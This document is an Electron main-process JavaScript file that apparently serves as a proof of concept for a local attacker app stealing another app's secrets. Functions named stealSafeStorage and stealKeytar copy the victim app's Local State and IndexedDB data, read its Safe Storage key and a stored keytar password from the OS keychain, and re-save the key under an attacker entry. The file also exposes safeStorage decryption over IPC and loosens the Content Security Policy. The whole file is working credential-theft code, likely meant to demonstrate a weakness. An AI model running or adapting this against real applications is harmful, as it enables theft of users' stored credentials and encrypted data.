const {app, BrowserWindow, ipcMain, safeStorage} = require('electron')
const serve = require('electron-serve');
const keytar = require('keytar');
const path = require('path');
const {rm, cp} = require('node:fs/promises');
const { cpSync } = require('node:fs');
const { platform } = require('node:process');
const { session } = require('electron')

const loadURL = serve({directory: __dirname});

if (platform === 'win32') {
  const userPath = app.getPath('userData');
  cpSync(`${userPath}/../demo/Local State`, `${userPath}/Local State`);
}

async function stealSafeStorage() {
  const userPath = app.getPath('userData');
  const dbPath = 'IndexedDB/app_-_0.indexeddb.leveldb/';
  await rm(`${userPath}/${dbPath}`, {recursive: true, force: true});
  await cp(`${userPath}/../demo/${dbPath}`, `${userPath}/${dbPath}`, { recursive: true});
  
  if (platform === 'darwin') {
    const key = await keytar.getPassword('demo Safe Storage', 'demo');
    await keytar.setPassword('attacker Safe Storage', 'attacker', key);
  }
}

async function stealKeytar() {
  return await keytar.getPassword('demo keytar storage', 'keytar');
}

function decrypt(e, buffer) {
  let plain = '';
  try {
    plain = safeStorage.decryptString(buffer)
  } catch (e) {
  }
  return plain;
}

app.whenReady().then(() => {
  ipcMain.handle('stealSafeStorage', stealSafeStorage);
  ipcMain.handle('stealKeytar', stealKeytar);
  ipcMain.handle('decrypt', decrypt);

  session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': ["script-src 'self' 'unsafe-inline'"]
      }
    })
  });

  const mainWindow = new BrowserWindow({
    x: 800,
    y: 100,
    width: 900,
    height: 650,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js')
    }
  });
  loadURL(mainWindow);
});

